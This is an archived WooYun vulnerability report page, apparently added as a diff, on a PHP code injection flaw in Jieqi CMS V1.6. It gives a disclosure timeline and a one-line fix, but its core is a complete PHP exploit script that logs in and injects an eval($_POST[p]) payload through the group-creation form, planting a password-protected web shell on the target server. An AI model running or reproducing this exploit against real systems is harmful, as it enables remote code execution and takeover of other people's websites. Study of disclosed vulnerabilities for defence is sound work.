@@ -1,0 +1,251 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Jieqi CMS V1.6 PHP Code Injection Vul  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Jieqi CMS V1.6 PHP Code Injection Vul  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/fly@wolvez">fly@wolvez</a> 
+</li><li>提交时间：		2013-01-06 16:59</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-06：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-02-20：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">杰奇网站管理系统（简称 JIEQI CMS，中国国家版权局著作权登记号：2006SR03382）是一套模块化的网站架设系统，具备简单灵活、性能卓越、安全可靠等特性。我们为大家提供了目前最流行的杰奇小说连载系统、杰奇原创漫画系统及数字出版解决方案，并提供各类网站定制服务。<br />
+<br />
+该系统存在多个远程安全漏洞，今天报告的这个是1.6版本的一个远程代码执行漏洞，应该有2年多历史了。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">详细信息见漏洞证明，需要有一个能创建圈子的用户。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><pre><code>&lt;?php<br />
+<br />
+print_r(&#039;<br />
++---------------------------------------------------------------------------+<br />
+Jieqi CMS V1.6 PHP Code Injection Exploit<br />
+by flyh4t<br />
+mail: phpsec at hotmail dot com<br />
+team: http://www.wolvez.org<br />
++---------------------------------------------------------------------------+<br />
+&#039;);<br />
+/**<br />
+ * works regardless of php.ini settings<br />
+*/<br />
+if ($argc &lt; 5) {<br />
+	print_r(&#039;<br />
++---------------------------------------------------------------------------+<br />
+Usage: php &#039;.$argv[0].&#039; host path username<br />
+host:      target server (ip/hostname)<br />
+path:      path to jieqicms <br />
+uasename:  a username who can create group<br />
+Example:<br />
+php &#039;.$argv[0].&#039; localhost /jieqicmsv1.6/ vipuser1 password<br />
++---------------------------------------------------------------------------+<br />
+&#039;);<br />
+	exit;<br />
+}<br />
+<br />
+error_reporting(7);<br />
+ini_set(&#039;max_execution_time&#039;, 0);<br />
+<br />
+$host = $argv[1];<br />
+$path = $argv[2];<br />
+$username = $argv[3];<br />
+$password = $argv[4];<br />
+<br />
+/*get cookie*/<br />
+$cookie_jar_index = &#039;cookie.txt&#039;;<br />
+$url1 = &quot;http://$host/$path/login.php&quot;;<br />
+$params = &quot;password=$password&amp;username=$username&amp;usecookie=86400&amp;submit=%26%23160%3B%B5%C7%26%23160%3B%26%23160%3B%C2%BC%26%23160%3B&amp;action=login&amp;jumpreferer=1&quot;;<br />
+$curl1 = curl_init();<br />
+curl_setopt($curl1, CURLOPT_URL, $url1);<br />
+curl_setopt($curl1, CURLOPT_COOKIEJAR, $cookie_jar_index);<br />
+curl_setopt($curl1, CURLOPT_POST, 1);<br />
+curl_setopt($curl1, CURLOPT_POSTFIELDS, $params);<br />
+ob_start();<br />
+$data1 = curl_exec($curl1);<br />
+if ($data1 === FALSE) {<br />
+	echo &quot;cURL Error: &quot; . curl_error($ch);<br />
+	exit(&#039;exploit failed&#039;);<br />
+}<br />
+curl_close($curl1);<br />
+ob_clean();<br />
+<br />
+/*get shell*/<br />
+<br />
+$params =&#039;-----------------------------23281168279961<br />
+Content-Disposition: form-data; name=&quot;gname&quot;<br />
+<br />
+&#039;;<br />
+$params .=&quot;&#039;;&quot;;<br />
+$params .=&#039;eval($_POST[p]);//flyh4t<br />
+-----------------------------23281168279961<br />
+Content-Disposition: form-data; name=&quot;gcatid&quot;<br />
+<br />
+1<br />
+-----------------------------23281168279961<br />
+Content-Disposition: form-data; name=&quot;gaudit&quot;<br />
+<br />
+1<br />
+-----------------------------23281168279961<br />
+Content-Disposition: form-data; name=&quot;gbrief&quot;<br />
+<br />
+1<br />
+-----------------------------23281168279961--<br />
+&#039;;<br />
+<br />
+$url2 = &quot;http://$host/$path/modules/group/create.php&quot;;<br />
+$curl2 = curl_init();<br />
+$header =array( &#039;Content-Type: multipart/form-data; boundary=---------------------------23281168279961&#039;	);<br />
+curl_setopt($curl2, CURLOPT_URL, $url2);<br />
+curl_setopt($curl2, CURLOPT_HTTPHEADER, $header);<br />
+curl_setopt($curl2, CURLOPT_COOKIEFILE, $cookie_jar_index);<br />
+<br />
+curl_setopt($curl2, CURLOPT_POST, 1);<br />
+curl_setopt($curl2, CURLOPT_POSTFIELDS, $params);<br />
+ob_start();<br />
+curl_exec($curl2);<br />
+curl_close($curl2);<br />
+$resp = ob_get_contents(); //$rs就是返回的内容<br />
+ob_clean();<br />
+<br />
+preg_match(&#039;/g=([0-9]{1,4})/&#039;, $resp, $shell);<br />
+<br />
+//print_r($shell);<br />
+//print_r($resp);<br />
+<br />
+$url = &quot;http://$host/$path/files/group/userdir/0/$shell[1]/info.php&quot;;<br />
+echo &quot;view you shell here(password:p)\r\n&quot; ;<br />
+echo $url;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">转意特殊字符 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/fly@wolvez" title="fly@wolvez">fly@wolvez</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016998" title="Jieqi CMS V1.6 PHP Code Injection Vul">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16998";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
